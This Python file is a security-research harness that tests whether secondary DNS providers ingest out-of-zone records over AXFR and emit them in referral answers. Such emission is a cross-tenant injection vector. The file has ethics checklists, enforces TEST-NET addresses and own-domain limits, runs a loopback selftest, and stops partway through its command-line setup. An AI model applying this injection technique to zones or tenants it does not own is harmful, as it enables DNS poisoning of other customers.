#!/usr/bin/env python3
"""Executable gap-B tester: the AXFR-in vector, automated for YOUR own account.

Execution frame (binding): this tool is for the researcher's own accounts and
own domains only. It was NOT executed against any provider from the authoring
environment: no account was created, no provider was contacted. Every live step
touches only (a) infrastructure the runner owns, or (b) the runner's own account
at a provider. The "victim" name is always a second domain the runner owns. All
probe addresses are RFC 5737 TEST-NET by default and enforced. If any step would
require touching a name or account that is not yours: stop.

What it automates:
  * hidden-primary zone with an out-of-zone A owner + in-zone delegation,
  * provider secondary registration through an adapter (BuddyNS-style API
    skeleton + generic AXFR/console fallback),
  * F1 (store) and F2 (emission) checks against the PROVIDER's own NS IPs,
  * cross-tenant / cross-delegation helpers and negative controls,
  * SUCCESS / PARTIAL / NEGATIVE / ABORT verdicts,
  * evidence JSON + raw capture bundle with SHA-256.

Usage:
    python3 poc/deploy/gapb_test.py --selftest
    python3 poc/deploy/gapb_test.py plan --config gapb.json
    python3 poc/deploy/gapb_test.py preflight --config gapb.json
    python3 poc/deploy/gapb_test.py run --config gapb.json --evidence-dir DIR
    python3 poc/deploy/gapb_test.py run --config gapb.json --evidence-dir DIR \
        --execute --acknowledge-own-names      # live; user's account only
"""
import argparse
import hashlib
import json
import os
import shlex
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT / "poc/vendor"))
from dnslib import A, DNSRecord, NS, QTYPE, RCODE, RR, SOA
from dnslib.server import BaseResolver, DNSLogger, DNSServer

SCHEMA = "gapb-axfr-in-test/1"

# RFC 5737 TEST-NET ranges: the only addresses the runbook allows as probes.
TEST_NET = ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")

DEFAULT_ADDRESSES = {
    "out_of_zone_a": "192.0.2.66",
    "sub_delegation": "203.0.113.10",
    "www": "203.0.113.11",
}

ETHICS_CHECKLIST = (
    "Only my own accounts and my own domains are used.",
    "All probe RDATA stays in RFC 5737 TEST-NET ranges.",
    "Queries are limited to the documented ones (no AXFR of third-party zones, no scans).",
    "Evidence contains no third-party customer data.",
    "The provider is notified afterwards regardless of outcome.",
    "If any step would touch a name or account that is not mine, I stop (ABORT).",
)

VERDICTS = ("SUCCESS", "PARTIAL", "NEGATIVE", "ABORT")


class GapBError(ValueError):
    pass


# --------------------------------------------------------------------------
# names and zone generation
# --------------------------------------------------------------------------

def norm(name):
    return str(name).strip().rstrip(".").lower()


def in_zone(name, zone):
    name, zone = norm(name), norm(zone)
    return name == zone or name.endswith("." + zone)


def is_test_net(address):
    import ipaddress
    ip = ipaddress.IPv4Address(address)
    return any(ip in ipaddress.IPv4Network(block) for block in TEST_NET)


def victim_ns_name(cfg):
    """The injected nameserver name: a second domain the runner owns."""
    return "ns.victim-own." + norm(cfg["victim_domain"])


def serial_for(cfg):
    return int(cfg.get("serial") or int(datetime.now(timezone.utc).strftime("%Y%m%d")) * 100 + 1)


def zone_records(cfg, include_out_of_zone=True):
    """Hidden-primary records for $TZONE, per the hidden-primary design.

    The out-of-zone A owner (victim-own.<victim_domain> -> TEST-NET) plus the
    in-zone delegation sub.$TZONE -> ns.victim-own.<victim_domain> are the two
    shapes whose F1 (store) / F2 (emission) behaviour is under test.
    """
    zone = norm(cfg["tzone"])
    victim = norm(cfg["victim_domain"])
    primary_host = norm(cfg.get("primary_host") or ("ns1.hidden." + victim))
    addresses = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))
    serial = serial_for(cfg)
    ttl = int(cfg.get("ttl", 3600))
    records = [
        {"name": zone, "type": "SOA", "ttl": ttl,
         "rdata": (primary_host, "hostmaster." + victim, serial)},
        {"name": zone, "type": "NS", "ttl": ttl, "rdata": primary_host},
        {"name": primary_host, "type": "A", "ttl": ttl,
         "rdata": cfg.get("hidden_primary_ip") or "127.0.0.1"},
    ]
    if include_out_of_zone:
        records.append({"name": "victim-own." + victim, "type": "A", "ttl": 300,
                        "rdata": addresses["out_of_zone_a"]})
    records += [
        {"name": "sub." + zone, "type": "NS", "ttl": 300, "rdata": victim_ns_name(cfg)},
        {"name": "sub." + zone, "type": "A", "ttl": 300, "rdata": addresses["sub_delegation"]},
        {"name": "www." + zone, "type": "A", "ttl": ttl, "rdata": addresses["www"]},
    ]
    return records


def render_zone(cfg, include_out_of_zone=True):
    """RFC 1035 master-format text for the hidden primary."""
    zone = norm(cfg["tzone"])
    primary_host = norm(cfg.get("primary_host") or ("ns1.hidden." + norm(cfg["victim_domain"])))
    lines = ["$ORIGIN " + zone + ".", "$TTL 3600"]
    for record in zone_records(cfg, include_out_of_zone):
        name, rtype, ttl = record["name"], record["type"], record["ttl"]
        owner = "@" if name == zone else name
        if rtype == "SOA":
            mname, rname, serial = record["rdata"]
            lines.append("%s %d IN SOA %s %s. (" % (owner, ttl, mname, rname))
            lines.append("            %d ; serial" % serial)
            lines.append("            3600 900 604800 300 )")
        else:
            lines.append("%s %d IN %s %s" % (owner, ttl, rtype, record["rdata"]))
    return "\n".join(lines) + "\n"


def named_conf_fragment(cfg, transfer_ips):
    zone = norm(cfg["tzone"])
    return ("zone \"%s\" {\n    type primary;\n    file \"/var/named/%s.zone\";\n"
            "    allow-transfer { %s; };\n    also-notify { %s; };\n};\n"
            % (zone, zone, "; ".join(transfer_ips) or "/* provider AXFR source IPs */",
               "; ".join(transfer_ips) or "/* provider AXFR source IPs */"))


# --------------------------------------------------------------------------
# local primary + provider fixtures (loopback only)
# --------------------------------------------------------------------------

def rr_for(record):
    name, rtype = record["name"], record["type"]
    if rtype == "A":
        return RR(name, QTYPE.A, rdata=A(record["rdata"]), ttl=record["ttl"])
    if rtype == "NS":
        return RR(name, QTYPE.NS, rdata=NS(record["rdata"]), ttl=record["ttl"])
    if rtype == "SOA":
        mname, rname, serial = record["rdata"]
        return RR(name, QTYPE.SOA, rdata=SOA(mname, rname + ".", (serial, 3600, 900, 604800, 300)),
                  ttl=record["ttl"])
    raise GapBError("unsupported record type: " + rtype)


class ZoneResolver(BaseResolver):
    """Tiny permissive primary: serves the zone and answers AXFR over TCP.

    The thing under test is the provider's ingest, not ours; a permissive local
    primary is exactly what the hidden-primary design prescribes when BIND refuses
    out-of-zone owners at load.
    """

    def __init__(self, records):
        self.records = list(records)
        self.zone = next(r["name"] for r in records if r["type"] == "SOA")

    def resolve(self, request, handler):
        qname, qtype = norm(request.q.qname), QTYPE[request.q.qtype]
        reply = request.reply()
        reply.header.aa = 1
        if qtype == "AXFR":
            if getattr(handler, "protocol", "udp") == "tcp":
                ordered = [r for r in self.records if r["type"] == "SOA"] + \
                          [r for r in self.records if r["type"] != "SOA"] + \
                          [r for r in self.records if r["type"] == "SOA"]
                for record in ordered:
                    reply.add_answer(rr_for(record))
                return reply
            reply.header.aa = 0
            reply.header.rcode = RCODE.REFUSED
            return reply
        for record in self.records:
            if norm(record["name"]) == qname and record["type"] == qtype:
                reply.add_answer(rr_for(record))
        if not reply.rr:
            reply.header.rcode = RCODE.NXDOMAIN
        return reply


class FixtureResolver(BaseResolver):
    """Provider-secondary fixture behaviours for --selftest (loopback only).

    behavior knobs:
      allow_soa          -- answers SOA (transfer accepted) or REFUSED
      store_out_of_zone  -- F1: answers for the out-of-zone A owner
      emit_additional    -- F2: attaches that A to the sub.$TZONE referral
    """

    def __init__(self, cfg, allow_soa=True, store_out_of_zone=True, emit_additional=True):
        self.cfg = cfg
        self.allow_soa = allow_soa
        self.store_out_of_zone = store_out_of_zone
        self.emit_additional = emit_additional
        self.zone = norm(cfg["tzone"])
        self.victim_owner = "victim-own." + norm(cfg["victim_domain"])
        self.ns_target = victim_ns_name(cfg)
        self.addresses = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))
        self.serial = serial_for(cfg)

    def resolve(self, request, handler):
        qname, qtype = norm(request.q.qname), QTYPE[request.q.qtype]
        reply = request.reply()
        if qname == self.zone and qtype == "SOA":
            if not self.allow_soa:
                reply.header.rcode = RCODE.REFUSED
                return reply
            reply.header.aa = 1
            reply.add_answer(RR(self.zone, QTYPE.SOA,
                                rdata=SOA("ns1.hidden." + norm(self.cfg["victim_domain"]),
                                          "hostmaster." + norm(self.cfg["victim_domain"]) + ".",
                                          (self.serial, 3600, 900, 604800, 300)), ttl=3600))
            return reply
        if qname == self.victim_owner and qtype in ("A", "ANY"):
            if not self.store_out_of_zone:
                reply.header.rcode = RCODE.NXDOMAIN
                return reply
            reply.header.aa = 1
            reply.add_answer(RR(self.victim_owner, QTYPE.A,
                                rdata=A(self.addresses["out_of_zone_a"]), ttl=300))
            return reply
        if qname == "sub." + self.zone:
            reply.header.aa = 1
            reply.add_auth(RR("sub." + self.zone, QTYPE.NS, rdata=NS(self.ns_target), ttl=300))
            if self.emit_additional:
                reply.add_ar(RR(self.ns_target, QTYPE.A,
                                rdata=A(self.addresses["out_of_zone_a"]), ttl=300))
            return reply
        reply.header.aa = 1
        reply.header.rcode = RCODE.NXDOMAIN
        return reply


class FixtureServer:
    """Loopback UDP+TCP DNS server for one fixture; ephemeral port."""

    def __init__(self, resolver):
        logger = DNSLogger(log="-request,-reply,-truncated,-error")
        self.servers = [DNSServer(resolver, address="127.0.0.1", port=0, tcp=tcp, logger=logger)
                        for tcp in (False, True)]
        self.port = self.servers[0].server.server_address[1]

    def start(self):
        for server in self.servers:
            server.start_thread()
        return self

    def stop(self):
        for server in self.servers:
            server.stop()
            server.server.server_close()

    @property
    def target(self):
        return {"name": "fixture", "ip": "127.0.0.1", "port": self.port}


# --------------------------------------------------------------------------
# queries and checks
# --------------------------------------------------------------------------

def query_ns(target, name, qtype="A", tcp=False, timeout=5):
    ip, port = target["ip"], int(target.get("port", 53))
    query = DNSRecord.question(name, qtype)
    query.header.rd = 0
    try:
        reply = DNSRecord.parse(query.send(ip, port, tcp=tcp, timeout=timeout))
    except (OSError, ValueError) as exc:
        return {"server": ip, "port": port, "name": norm(name), "type": qtype, "tcp": tcp,
                "error": str(exc), "rcode": None, "aa": False,
                "answers": [], "authority": [], "additional": []}
    def rows(records):
        return [{"name": norm(rr.rname), "type": QTYPE[rr.rtype],
                 "value": str(rr.rdata).rstrip("."), "ttl": rr.ttl} for rr in records]
    return {"server": ip, "port": port, "name": norm(name), "type": qtype, "tcp": tcp,
            "rcode": RCODE[reply.header.rcode], "aa": bool(reply.header.aa),
            "answers": rows(reply.rr), "authority": rows(reply.auth),
            "additional": rows(reply.ar), "raw": str(reply)}


def check_transfer(cfg, targets, query=query_ns):
    """Serial at the provider NS must match the primary (A4)."""
    serial = serial_for(cfg)
    per_target = []
    for target in targets:
        answer = query(target, norm(cfg["tzone"]), "SOA")
        soa = [r for r in answer["answers"] if r["type"] == "SOA"]
        serials = [int(r["value"].split()[2]) for r in soa] if soa else []
        per_target.append({"target": target["ip"], "rcode": answer["rcode"],
                           "serials": serials, "match": serial in serials})
    if all(row["match"] for row in per_target):
        status = "positive"
    elif any(row["rcode"] == "REFUSED" or row["rcode"] is None for row in per_target):
        status = "refused"
    else:
        status = "mismatch"
    return {"status": status, "expected_serial": serial, "per_target": per_target}


def check_f1(cfg, targets, query=query_ns):
    """F1 store: does the provider answer for the out-of-zone A owner? (A4)"""
    owner = "victim-own." + norm(cfg["victim_domain"])
    expected = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))["out_of_zone_a"]
    per_target = []
    for target in targets:
        answer = query(target, owner, "A")
        values = {r["value"] for r in answer["answers"] if r["type"] == "A"}
        per_target.append({"target": target["ip"], "rcode": answer["rcode"], "aa": answer["aa"],
                           "values": sorted(values), "positive": expected in values and answer["aa"]})
    return {"status": "positive" if per_target and all(r["positive"] for r in per_target) else "negative",
            "owner": owner, "expected": expected, "per_target": per_target}


def classify_additional(owner, delegation, zone):
    """Is the emitted A attached to a name outside the delegation and the zone?"""
    if in_zone(owner, delegation):
        return "in-delegation-glue"
    if in_zone(owner, zone):
        return "sibling-like"
    return "out-of-zone"


def check_f2(cfg, targets, query=query_ns, repeats=2):
    """F2 emission: the referral ADDITIONAL from the PROVIDER's own NS IPs (A5)."""
    zone = norm(cfg["tzone"])
    delegation = "sub." + zone
    expected = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))["out_of_zone_a"]
    ns_target = victim_ns_name(cfg)
    rounds = []
    for _ in range(max(1, int(repeats))):
        per_target = []
        for target in targets:
            answer = query(target, delegation, "NS")
            delegated = {r["value"] for r in answer["authority"]
                         if r["type"] == "NS" and norm(r["name"]) == delegation}
            vector = []
            for row in answer["additional"]:
                shape = classify_additional(row["name"], delegation, zone)
                vector.append({"owner": row["name"], "type": row["type"], "value": row["value"],
                               "shape": shape,
                               "vector": (row["type"] == "A" and shape == "out-of-zone"
                                          and row["name"] == ns_target and row["value"] == expected)})
            per_target.append({"target": target["ip"], "rcode": answer["rcode"],
                               "delegated": sorted(delegated), "additional": vector,
                               "positive": any(v["vector"] for v in vector)
                                           and ns_target in delegated})
        rounds.append({"per_target": per_target,
                       "positive": any(r["positive"] for r in per_target)})
    return {"status": "positive" if rounds and all(r["positive"] for r in rounds) else "negative",
            "delegation": delegation, "ns_target": ns_target, "expected": expected,
            "repeats": len(rounds), "rounds": rounds}


def cross_delegation_check(cfg, f2):
    """A6.1: the emitted owner belongs to no delegation under $TZONE (required)."""
    zone = norm(cfg["tzone"])
    delegation = "sub." + zone
    ns_target = victim_ns_name(cfg)
    satisfied = (f2["status"] == "positive"
                 and not in_zone(ns_target, delegation) and not in_zone(ns_target, zone))
    return {"status": "positive" if satisfied else "negative", "owner": ns_target,
            "detail": "emitted owner is outside both the delegation and " + zone}


def b_victim_check(f2, tenant_b):
    """A6.2: the fake A appears in A's referral although the owner is B's name."""
    ns_name = norm(tenant_b["ns_name"])
    for round_ in f2.get("rounds", []):
        for target in round_["per_target"]:
            for row in target["additional"]:
                if row["owner"] == ns_name and row["vector"]:
                    return {"status": "positive", "detail": "A's referral carries B's nameserver name"}
    return {"status": "negative", "detail": "no emission into A's referral for B's name"}


def b_contamination_check(b_answers, tenant_b):
    """A6.2 negative control: B's own zone still returns B's real address."""
    real = tenant_b["victim_real_ip"]
    values = {r["value"] for answer in b_answers for r in answer["answers"] if r["type"] == "A"}
    contaminated = bool(values) and values != {real}
    return {"status": "negative" if contaminated else "positive",
            "values": sorted(values), "expected": real,
            "detail": "B's data is contaminated — notify immediately" if contaminated
                      else "B's zone returns B's real address (vector is emission only)"}


def attribution_check(cfg):
    """A6.2: both zones served by the same provider NS set (shared platform)."""
    provider = sorted(cfg["provider"].get("ns_ips") or [])
    tenant_b = sorted((cfg.get("tenant_b") or {}).get("ns_ips") or [])
    same = bool(provider) and provider == tenant_b
    return {"status": "positive" if same else "negative",
            "provider_ns_ips": provider, "tenant_b_ns_ips": tenant_b}


def control_primary_check(cfg, targets, query=query_ns):
    """A6.3(a): your own primary emits it too — the finding is about the provider."""
    delegation = "sub." + norm(cfg["tzone"])
    expected = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))["out_of_zone_a"]
    hits = []
    for target in targets:
        answer = query(target, delegation, "NS")
        hits.append(any(r["type"] == "A" and r["value"] == expected for r in answer["additional"]))
    return {"status": "positive" if any(hits) else "negative",
            "detail": "control: the same ADDITIONAL on the runner's own primary"}


def control_variant_check(cfg, targets, query=query_ns):
    """A6.3(b): a zone without the out-of-zone A must carry no such ADDITIONAL."""
    delegation = "sub." + norm(cfg["tzone"])
    expected = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))["out_of_zone_a"]
    leaks = []
    for target in targets:
        answer = query(target, delegation, "NS")
        leaks.extend(r for r in answer["additional"] if r["type"] == "A" and r["value"] == expected)
    return {"status": "positive" if not leaks else "negative",
            "detail": "clean variant emits no out-of-zone ADDITIONAL" if not leaks
                      else "clean variant leaked the injected address"}


# --------------------------------------------------------------------------
# verdict + evidence
# --------------------------------------------------------------------------

def implementation_guess(results):
    if results["f2"]["status"] == "positive":
        return ("PowerDNS-class auth: emits NS targets present in its own zone data "
                "(the AXFR-in-stored A is in its own data)")
    if results["f1"]["status"] == "positive":
        return "stores out-of-zone owners at ingest; ADDITIONAL processing restricted"
    return "BOUNDARY-CHECK class: refuses or strips out-of-zone owners at load/ingest"


def decide_verdict(results, abort_reason=None, cross_tenant="none"):
    """A8: SUCCESS / PARTIAL / NEGATIVE / ABORT."""
    if abort_reason:
        return {"verdict": "ABORT", "reason": abort_reason,
                "action": "stop immediately; keep evidence; no further queries"}
    if results["f2"]["status"] == "positive":
        return {"verdict": "SUCCESS", "cross_tenant": cross_tenant,
                "action": "notify the vendor today; record in the vectors artifact"}
    if results["f1"]["status"] == "positive":
        return {"verdict": "PARTIAL",
                "action": "report as ingest hygiene only; not a referral-primitive vector"}
    return {"verdict": "NEGATIVE",
            "action": "valuable negative (the fix working); move to the fallback vectors"}


def evidence_row(cfg, results, verdict, cross_tenant, raw_dir=None):
    return {
        "schema": SCHEMA,
        "provider": (cfg.get("provider") or {}).get("adapter", "unknown"),
        "product": "secondary DNS",
        "date_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "zone": norm(cfg["tzone"]),
        "victim_name": victim_ns_name(cfg),
        "f1_store": results["f1"]["status"] == "positive",
        "f2_emit": results["f2"]["status"] == "positive",
        "cross_tenant": cross_tenant,
        "implementation_guess": implementation_guess(results),
        "raw": raw_dir,
        "vendor_notified_utc": None,
        "fixed_utc": None,
        "verdict": verdict["verdict"],
        "verdict_action": verdict["action"],
        "checks": results,
    }


def write_evidence(evidence_dir, cfg, results, verdict, cross_tenant, raw_files=None):
    """A7: evidence JSON + raw captures + INDEX + SHA256SUMS."""
    directory = Path(evidence_dir)
    directory.mkdir(parents=True, exist_ok=True)
    for name, data in (raw_files or {}).items():
        (directory / name).write_text(data if isinstance(data, str) else data.decode())
    (directory / "zone-served.txt").write_text(render_zone(cfg))
    row = evidence_row(cfg, results, verdict, cross_tenant,
                       raw_dir=directory.name)
    (directory / "evidence.json").write_text(json.dumps(row, indent=2, sort_keys=True) + "\n")
    names = sorted(p.name for p in directory.iterdir() if p.is_file()
                   and p.name not in ("INDEX.txt", "SHA256SUMS.txt"))
    (directory / "INDEX.txt").write_text("\n".join(names) + "\n")
    sums = []
    for name in names:
        data = (directory / name).read_bytes()
        sums.append(hashlib.sha256(data).hexdigest() + "  " + name)
    (directory / "SHA256SUMS.txt").write_text("\n".join(sums) + "\n")
    return row


# --------------------------------------------------------------------------
# provider adapters (plan here; live execution is the runner's, never ours)
# --------------------------------------------------------------------------

class ProviderAdapter:
    """Interface: plan() is safe anywhere; configure() is for the runner only."""

    name = "abstract"

    def __init__(self, provider_cfg):
        self.cfg = dict(provider_cfg or {})

    def plan(self, ctx):
        raise NotImplementedError

    def configure(self, ctx):
        """Live registration. The runner completes this against their account."""
        raise GapBError("adapter " + self.name + " is plan-only here: complete the "
                        "documented steps against your own account, then re-run checks")


class BuddyNSAdapter(ProviderAdapter):
    """BuddyNS-style secondary-DNS API skeleton.

    plan() spells out the exact request the runner issues with their own token.
    The request is deliberately not sent from this codebase.
    """

    name = "buddyns"
    API_BASE = "https://www.buddyns.com/api/v2/"

    def plan(self, ctx):
        zone = norm(ctx["zone"])
        master = ctx.get("master_ip") or "<PRIMARY_IP>"
        return {
            "adapter": self.name,
            "api": {
                "create_secondary_zone": {
                    "method": "POST",
                    "url": self.API_BASE + "zone/",
                    "auth": "header: Authorization: Bearer <YOUR BUDDYNS API TOKEN>",
                    "body": {"zone": zone, "master": master, "tsig": ctx.get("tsig") or None},
                },
                "read_assigned_ns": {
                    "method": "GET",
                    "url": self.API_BASE + "zone/" + zone + "/",
                    "auth": "header: Authorization: Bearer <YOUR BUDDYNS API TOKEN>",
                    "expect": "record 'ns'/'records' entries -> fill provider.ns_names/ns_ips",
                },
            },
            "note": ("skeleton: the request is documented, not sent. Transfer comes from the "
                     "provider's AXFR source IPs: whitelist them in allow-transfer."),
            "console_fallback": [
                "Dashboard -> Secondary DNS -> Add zone " + zone,
                "Primary/master: " + master,
                "Whitelist the provider's AXFR source IPs in allow-transfer/also-notify",
                "Record the assigned NS names and their IPs in the config",
            ],
        }

    def configure(self, ctx):
        plan = self.plan(ctx)
        raise GapBError("BuddyNS adapter is a skeleton; perform the planned request with your "
                        "own token (" + plan["api"]["create_secondary_zone"]["url"] + ") and "
                        "record provider.ns_names/ns_ips in the config")


class GenericAXFRAdapter(ProviderAdapter):
    """Generic AXFR secondary: exact console steps, no API assumed."""

    name = "generic-axfr"

    def plan(self, ctx):
        zone = norm(ctx["zone"])
        master = ctx.get("master_ip") or "<PRIMARY_IP>"
        return {
            "adapter": self.name,
            "console_fallback": [
                "Provider console -> Secondary DNS / Backup DNS / Slave zone -> Add " + zone,
                "Primary/master: " + master + " (port 53 TCP/UDP)",
                "Whitelist the provider's AXFR source IPs in allow-transfer/also-notify",
                "Optional: set up TSIG and record the key name in the evidence dir",
                "Record the assigned NS set and their IPs (the only addresses you will query)",
            ],
            "note": "no API: the runner performs the console steps in their own account",
        }

    def configure(self, ctx):
        raise GapBError("generic adapter emits console steps only; perform them in your own "
                        "provider account and record provider.ns_names/ns_ips")


ADAPTERS = {adapter.name: adapter for adapter in (BuddyNSAdapter, GenericAXFRAdapter)}


# --------------------------------------------------------------------------
# config, preflight, plan
# --------------------------------------------------------------------------

def load_config(path):
    cfg = json.loads(Path(path).read_text())
    for field in ("tzone", "victim_domain"):
        if not isinstance(cfg.get(field), str) or "." not in cfg[field]:
            raise GapBError(field + " must be a domain name you own")
    if norm(cfg["tzone"]) == norm(cfg["victim_domain"]):
        raise GapBError("tzone and victim_domain must be two different domains you own")
    addresses = dict(DEFAULT_ADDRESSES, **(cfg.get("addresses") or {}))
    for field, value in addresses.items():
        if not is_test_net(value):
            raise GapBError("addresses." + field + " must stay in RFC 5737 TEST-NET: " + str(value))
    provider = cfg.get("provider") or {}
    if provider.get("adapter") not in ADAPTERS:
        raise GapBError("provider.adapter must be one of " + ", ".join(sorted(ADAPTERS)))
    return cfg


def preflight(cfg):
    """Fail closed: live runs need the runner's own credentials and attestations."""
    rows = []

    def result(scope, status, description):
        rows.append({"scope": scope, "status": status, "description": description})

    provider = cfg.get("provider") or {}
    if provider.get("account") and provider.get("api_token"):
        result("credentials", "PASS", "provider account and API token supplied (own account)")
    else:
        result("credentials", "BLOCKED",
               "provider account/API token missing: live runs stay disabled (fail closed)")
    checklist = cfg.get("checklist") or {}
    if checklist.get("own_names_confirmed") and checklist.get("tos_reviewed"):
        result("ethics", "PASS", "checklist attested: own names only, ToS reviewed, vendor gets notified")
    else:
        result("ethics", "BLOCKED",
               "checklist not attested (own_names_confirmed/tos_reviewed): live runs stay disabled")
    if provider.get("ns_ips"):
        result("provider", "PASS", "provider NS IPs recorded: " + " ".join(provider["ns_ips"]))
    else:
        result("provider", "PENDING",
               "provider NS IPs not recorded yet (fill after secondary registration)")
    if cfg.get("hidden_primary_ip"):
        result("primary", "PASS", "hidden primary IP assigned")
    else:
        result("primary", "PENDING", "hidden primary IP not assigned (your VPS / reachable host)")
    result("addresses", "PASS", "probe addresses are RFC 5737 TEST-NET only")
    result("local", "PASS" if shutil_which("dig") else "PENDING", "dig available for manual cross-checks")
    result("external", "PENDING",
           "transfer/F1/F2 have not been run; run --execute on your own account after this is green")
    return rows


def shutil_which(name):
    import shutil
    return shutil.which(name)


def plan_text(cfg):
    zone = norm(cfg["tzone"])
    victim = norm(cfg["victim_domain"])
    provider = cfg.get("provider") or {}
    adapter = ADAPTERS[provider["adapter"]](provider)
    transfer_ips = provider.get("axfr_source_ips") or []
    lines = []
    lines.append("== gap-B AXFR-in test plan (dry run; nothing is contacted) ==")
    lines.append("zone under test : " + zone)
    lines.append("victim name     : " + victim_ns_name(cfg) + "  (second domain you own: " + victim + ")")
    lines.append("serial          : " + str(serial_for(cfg)))
    lines.append("")
    lines.append("== hidden-primary zone ==")
    lines.append(render_zone(cfg).rstrip())
    lines.append("")
    lines.append("== named.conf fragment ==")
    lines.append(named_conf_fragment(cfg, transfer_ips).rstrip())
    lines.append("")
    lines.append("== secondary registration (adapter: " + adapter.name + ") ==")
    lines.append(json.dumps(adapter.plan({"zone": zone,
                                          "master_ip": cfg.get("hidden_primary_ip"),
                                          "tsig": provider.get("tsig")}), indent=2, sort_keys=True))
    lines.append("")
    lines.append("== verification (A4/A5) — against the PROVIDER's own NS IPs ==")
    ns_ips = provider.get("ns_ips") or ["<PROVIDER_NS_IP>>"]
    for ip in ns_ips:
        lines.append("dig @" + ip + " victim-own." + victim + " A +norecurse +noall +answer +authority +additional")
        lines.append("dig @" + ip + " sub." + zone + " NS +norecurse +qr +noall +answer +authority +additional +comments")
    lines.append("dig +trace sub." + zone + " NS")
    lines.append("")
    lines.append("== go / no-go checklist ==")
    for item in ETHICS_CHECKLIST:
        lines.append(" [ ] " + item)
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------
# --selftest: full verdict logic against loopback fixtures
# --------------------------------------------------------------------------

def selftest():
    print("gap-B selftest: local fixtures only; no provider is contacted")
    expectations = [
        ("permissive", dict(allow_soa=True, store_out_of_zone=True, emit_additional=True), "SUCCESS"),
        ("store-only", dict(allow_soa=True, store_out_of_zone=True, emit_additional=False), "PARTIAL"),
        ("stripping", dict(allow_soa=True, store_out_of_zone=False, emit_additional=False), "NEGATIVE"),
        ("refusing", dict(allow_soa=False, store_out_of_zone=False, emit_additional=False), "NEGATIVE"),
    ]
    failures = []
    for name, behavior, expected in expectations:
        cfg = {"tzone": "t.example", "victim_domain": "yourexample.net", "serial": 2026102701,
               "provider": {"adapter": "generic-axfr", "ns_ips": []}}
        server = FixtureServer(FixtureResolver(cfg, **behavior)).start()
        try:
            targets = [server.target]
            results = {
                "transfer": check_transfer(cfg, targets),
                "f1": check_f1(cfg, targets),
                "f2": check_f2(cfg, targets, repeats=2),
            }
            results["cross_delegation"] = cross_delegation_check(cfg, results["f2"])
            verdict = decide_verdict(results)
            observed = verdict["verdict"]
        finally:
            server.stop()
        ok = observed == expected
        if not ok:
            failures.append(name + ": expected " + expected + ", observed " + observed)
        print("  %-12s F1=%-8s F2=%-8s -> verdict %-8s %s" %
              (name, results["f1"]["status"], results["f2"]["status"], observed,
               "OK" if ok else "MISMATCH"))
    # ABORT path (A8): any abort condition short-circuits to ABORT.
    verdict = decide_verdict({"f1": {"status": "positive"}, "f2": {"status": "positive"}},
                             abort_reason="provider asked to stop")
    ok = verdict["verdict"] == "ABORT"
    if not ok:
        failures.append("abort case did not abort")
    print("  %-12s abort condition -> verdict %-8s %s" % ("abort", verdict["verdict"],
                                                          "OK" if ok else "MISMATCH"))
    # Cross-tenant helpers (A6) on synthetic captures.
    cfg = {"tzone": "t.example", "victim_domain": "yourexample.net",
           "provider": {"adapter": "generic-axfr", "ns_ips": ["192.0.2.53"]},
           "tenant_b": {"ns_name": "ns.victim-own.yourexample.net", "ns_ips": ["192.0.2.53"],
                        "victim_real_ip": "203.0.113.77"}}
    server = FixtureServer(FixtureResolver(cfg, allow_soa=True, store_out_of_zone=True,
                                           emit_additional=True)).start()
    try:
        f2 = check_f2(cfg, [server.target], repeats=1)
        cross = cross_delegation_check(cfg, f2)
        b_victim = b_victim_check(f2, cfg["tenant_b"])
        b_clean = b_contamination_check(
            [{"answers": [{"type": "A", "value": "203.0.113.77"}]}], cfg["tenant_b"])
        attribution = attribution_check(cfg)
    finally:
        server.stop()
    for label, result in (("cross-delegation", cross), ("B-victim", b_victim),
                          ("B-contamination", b_clean), ("attribution", attribution)):
        ok = result["status"] == "positive"
        if not ok:
            failures.append(label + " helper: " + result["status"])
        print("  %-12s %-8s %s" % (label, result["status"], "OK" if ok else "MISMATCH"))
    # Controls + evidence writer.
    server = FixtureServer(FixtureResolver(cfg, allow_soa=True, store_out_of_zone=True,
                                           emit_additional=True)).start()
    variant = FixtureServer(ZoneResolver(zone_records(cfg, include_out_of_zone=False))).start()
    try:
        control_a = control_primary_check(cfg, [server.target])
        control_b = control_variant_check(cfg, [variant.target])
    finally:
        server.stop()
        variant.stop()
    for label, result in (("control-own", control_a), ("control-clean", control_b)):
        ok = result["status"] == "positive"
        if not ok:
            failures.append(label + ": " + result["detail"])
        print("  %-12s %-8s %s" % (label, result["status"], "OK" if ok else "MISMATCH"))
    import tempfile
    with tempfile.TemporaryDirectory() as directory:
        results = {"transfer": {"status": "positive"}, "f1": {"status": "positive"},
                   "f2": {"status": "positive"}, "cross_delegation": {"status": "positive"}}
        row = write_evidence(directory, cfg, results, {"verdict": "SUCCESS", "action": "-"},
                             "cross-delegation", raw_files={"f2-referral-additional.txt": "raw"})
        written = sorted(p.name for p in Path(directory).iterdir())
        ok = ("evidence.json" in written and "INDEX.txt" in written and "SHA256SUMS.txt" in written
              and row["verdict"] == "SUCCESS")
        if not ok:
            failures.append("evidence writer: " + ", ".join(written))
        print("  %-12s %-8s %s" % ("evidence", "written" if ok else "broken", "OK" if ok else "MISMATCH"))
    print("selftest:", "OK — all verdict paths exercised" if not failures
          else "FAIL\n" + "\n".join(failures))
    return 1 if failures else 0


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--selftest", action="store_true",
                        help="exercise the full verdict logic against local fixtures")
    sub = parser.add_subparsers(dest="command")
    plan = sub.add_parser("plan", help="dry run: zone, adapter steps, verification commands")
    plan.add_argument("--config", type=Path, required=True)
    pre = sub.add_parser("preflight", help="fail-closed readiness report")
    pre.add_argument("--config", type=Path, required=True)
    run = sub.add_parser("run", help="verify F1/F2 and write evidence (live only with --execute)")
    run.add_argument("--config", type=Path, required=True)
    run.add_argument("--evidence-dir", type=Path, required=True)
